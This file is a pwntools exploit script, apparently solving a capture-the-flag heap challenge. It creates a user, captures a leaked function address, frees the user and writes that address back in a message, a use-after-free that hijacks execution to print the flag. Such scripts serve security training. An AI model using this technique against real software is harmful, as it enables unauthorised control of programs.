from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Create user
io.sendlineafter(b'(e)xit', b'M')
io.sendlineafter(b':', b'crypto')

# Leak memory
io.sendlineafter(b'(e)xit', b'S')
io.recvuntil(b'OOP! Memory leak...', drop=True)
leak = int(io.recvlineS(), 16)
info("leaked hahaexploitgobrrr() address: %#x", leak)

# Free the user
io.sendlineafter(b'(e)xit', b'I')
io.sendlineafter(b'?', b'Y')

# Leave a message (leaked address)
io.sendlineafter(b'(e)xit', b'L')
io.sendlineafter(b':', flat(leak))

# Got Flag?
warn(io.recvlines(2)[1].decode())
